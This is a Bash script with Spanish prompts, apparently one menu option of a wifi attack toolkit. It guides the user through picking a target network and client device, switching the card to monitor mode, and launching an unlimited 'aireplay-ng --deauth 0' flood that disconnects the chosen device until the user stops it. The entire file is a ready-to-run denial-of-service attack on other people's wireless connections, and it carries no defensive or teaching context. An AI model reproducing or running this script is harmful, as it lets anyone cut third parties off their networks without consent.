#!bin/bash

source installer.sh

#Comprobacion de que la Tarjeta de Red tenga puesto el Modo Managed y si no lo cambia + rellenar contendor $interfaz#
card
echo
read -p "[*] Escribe la Interfaz de la Tarjeta de Red (Ej: wlan0): " interfaz
check_wifi_mode $interfaz
check_managed $mode
#Fin#
Title
echo "[6] Desconectar a un disposito de una Red Wifi"
echo 
echo "[#] Copia el BSSID y CHAN del Wifi objetivo, puede tardar hasta 1 minuto en aparecer la Red Objetivo"
echo
echo
sudo gnome-terminal --geometry 100x24+1300+20 -- bash -c "sudo nmcli dev wifi list && sleep 9999999999" &
read -p "[*] Copia el BSSID del Wifi Objetivo y pegelo a continuacion: " bssid
read -p "[*] Copia el Canal (CHAN) del Wifi Objetivo y pegelo a continuacion: " ch
sudo pkill gnome-terminal

#Activar Modo Monitor
ActMonitor
#Fin#
Title
echo "[#] Pulse Ctrl + c en la Terminal Secundaria (Cuando aparezca por pantalla la MAC/STATION del Objetivo)"
echo
sudo gnome-terminal --geometry 100x34+1300+20 -- bash -c "sudo airodump-ng -c $ch --bssid $bssid $interfaz2 --band abg && sleep 99999999" &
echo
read -p "[*] Copia la MAC/STATION del Objetivo y pegala a continuacion: " mac
sudo pkill gnome-terminal
echo
sleep 1
echo "Listo"
sleep 1
Title
echo "[#] Pulse Ctrl + c (Para finalizar el Ataque y el Objetivo se reconecte al Wifi)"
echo
echo
echo "========================================================================================="
echo "                      El Objetivo ($mac) esta siendo Atacado"
echo "========================================================================================="
echo
sudo gnome-terminal --geometry 100x34+1300+20 -- sudo airodump-ng -c $ch --bssid $bssid $interfaz2 --band abg &
sleep 2
sudo aireplay-ng --deauth 0 -a $bssid -c $mac $interfaz2
sudo pkill gnome-terminal
echo
echo
#Desactivar Modo Monitor
DesaMonitor
#Fin#
echo
echo
echo "#####################"
echo "[1] Volver al Menu"
echo "[2] Volver a ejecutar"
echo "[3] Salir"
echo "#####################"
echo
read -p "Elige una opcion: " opc2
	case $opc2 in
			1 )	bash inhibitor.sh
				;;
			2 )	bash requisitos/6.sh
				;;
			3 )	exit
				;;
			* )	echo
				echo "$RRPLY No es una opcion valida"
	esac
